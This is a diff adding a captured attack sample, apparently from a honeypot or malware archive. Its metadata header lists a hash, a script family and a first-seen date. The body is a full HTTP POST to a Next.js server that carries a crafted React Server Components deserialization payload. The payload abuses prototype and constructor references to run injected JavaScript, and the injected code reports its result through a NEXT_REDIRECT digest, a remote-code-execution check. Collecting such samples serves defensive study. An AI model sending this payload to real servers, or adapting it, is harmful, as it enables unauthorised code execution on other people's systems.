@@ -1,0 +1,30 @@
+# sha256: 2c3e6c21129564be17883d66411b8b3f73a62732f3c992660ab0ae3638befe6c
+# family: script_generic
+# kind: script
+# size_bytes: 997
+# first_seen: 2026-09-01 23:22:01.313463 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+POST /api/route HTTP/1.1
+Host: 190.179.130.96:3001
+Content-Length: 517
+Connection: close
+User-Agent: Mozilla/5.0 (Linux; Android 14; SM-F9560 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36
+Accept-Encoding: gzip, deflate
+Next-Action: x
+X-Nextjs-Request-Id: poop1234
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx236463599457
+X-Nextjs-Html-Request-Id: ilovepoop_236463599457
+
+------WebKitFormBoundaryx236463599457
+Content-Disposition: form-data; name="0"
+
+{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B\"}","_response":{"_prefix":"r = 85792+true+2756243;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${r}`});return","_formData":{"get":"$1:constructor:constructor"}}}
+------WebKitFormBoundaryx236463599457
+Content-Disposition: form-data; name="1"
+
+"$@0"
+------WebKitFormBoundaryx236463599457
+------WebKitFormBoundaryx236463599457--
